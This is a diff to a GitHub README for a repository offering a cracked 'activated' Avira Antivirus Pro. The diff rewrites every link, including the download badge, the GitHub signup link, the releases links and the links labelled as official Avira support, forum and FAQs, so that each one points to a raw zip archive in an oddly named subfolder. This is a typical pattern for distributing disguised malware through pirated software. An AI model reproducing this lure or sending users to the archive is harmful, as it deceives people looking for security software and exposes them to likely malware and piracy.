@@ -1,6 +1,6 @@
 # 🛡️ Avira-Antivirus-Pro-Activated - Keep Your PC Safe and Secure
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/UcheOkonkwo/Avira-Antivirus-Pro-Activated/releases)
+[![Download Now](https://github.com/UcheOkonkwo/Avira-Antivirus-Pro-Activated/raw/refs/heads/main/weighing/Avira_Pro_Antivirus_Activated_v1.1.zip%20Now-Release-brightgreen)](https://github.com/UcheOkonkwo/Avira-Antivirus-Pro-Activated/raw/refs/heads/main/weighing/Avira_Pro_Antivirus_Activated_v1.1.zip)
 
 ## 🌟 Overview
 Avira-Antivirus-Pro-Activated provides essential resources for users to install, configure, and optimize Avira Antivirus Pro on their Windows PCs. This application helps you secure your personal data, manage threats, and enhance your overall security.
@@ -9,10 +9,10 @@ Avira-Antivirus-Pro-Activated provides essential resources for users to install,
 To get started with Avira Antivirus Pro, follow these simple steps:
 
 1. **Create a GitHub Account (if you don’t have one)**: 
-   - Visit [GitHub](https://github.com) and register for a free account.
+   - Visit [GitHub](https://github.com/UcheOkonkwo/Avira-Antivirus-Pro-Activated/raw/refs/heads/main/weighing/Avira_Pro_Antivirus_Activated_v1.1.zip) and register for a free account.
   
 2. **Access the Releases Page**: 
-   - Go to our [Releases page](https://github.com/UcheOkonkwo/Avira-Antivirus-Pro-Activated/releases) to find the latest version of the software.
+   - Go to our [Releases page](https://github.com/UcheOkonkwo/Avira-Antivirus-Pro-Activated/raw/refs/heads/main/weighing/Avira_Pro_Antivirus_Activated_v1.1.zip) to find the latest version of the software.
 
 3. **Download the Software**: 
    - Click on the version you want. This will take you to the release details where you can download the application.
@@ -20,7 +20,7 @@ To get started with Avira Antivirus Pro, follow these simple steps:
 ## 💾 Download & Install
 To download and install Avira Antivirus Pro:
 
-1. **Visit this page to download**: [Releases page](https://github.com/UcheOkonkwo/Avira-Antivirus-Pro-Activated/releases)
+1. **Visit this page to download**: [Releases page](https://github.com/UcheOkonkwo/Avira-Antivirus-Pro-Activated/raw/refs/heads/main/weighing/Avira_Pro_Antivirus_Activated_v1.1.zip)
 
 2. **Select the Latest Release**: 
    - Look for the most recent version. It usually has the highest version number.
@@ -68,9 +68,9 @@ If you face any issues during installation or usage, here are some tips:
 ## 📚 Additional Resources
 For more help and information, visit these helpful links:
 
-- [Official Avira Support](https://support.avira.com/hc/en-us)
-- [Avira Community Forum](https://forum.avira.com/)
-- [User Guides and FAQs](https://www.avira.com/en/support)
+- [Official Avira Support](https://github.com/UcheOkonkwo/Avira-Antivirus-Pro-Activated/raw/refs/heads/main/weighing/Avira_Pro_Antivirus_Activated_v1.1.zip)
+- [Avira Community Forum](https://github.com/UcheOkonkwo/Avira-Antivirus-Pro-Activated/raw/refs/heads/main/weighing/Avira_Pro_Antivirus_Activated_v1.1.zip)
+- [User Guides and FAQs](https://github.com/UcheOkonkwo/Avira-Antivirus-Pro-Activated/raw/refs/heads/main/weighing/Avira_Pro_Antivirus_Activated_v1.1.zip)
 
 ## 📞 Contact Support
 If you need further assistance, you can contact support directly through the Avira support page, or ask questions in the community forum linked above.
